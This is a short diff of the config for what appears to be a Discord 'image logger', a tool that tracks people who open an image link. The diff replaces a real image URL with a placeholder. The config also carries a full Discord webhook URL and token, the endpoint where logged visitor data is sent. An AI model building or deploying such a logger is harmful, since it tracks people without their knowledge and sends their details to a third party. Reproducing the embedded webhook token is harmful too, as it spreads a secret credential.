@@ -10,7 +10,7 @@ __author__ = "07TEAM"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1224360542597152929/sFBoSdX-PiSL-k1gtOTfc_6U8YXD8KrvzLHFIa8Rqxc2e2uKakBNMUIwdOWfxF8L4Ew0",
-    "image": "https://media.discordapp.net/attachments/1210933554192715858/1224333635235090432/kici_kici_neyro.png?ex=661d1c8d&is=660aa78d&hm=73399441e6885c05a0c09485fe140475438f4dad58dfe904936c75f26fb13441&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
+    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
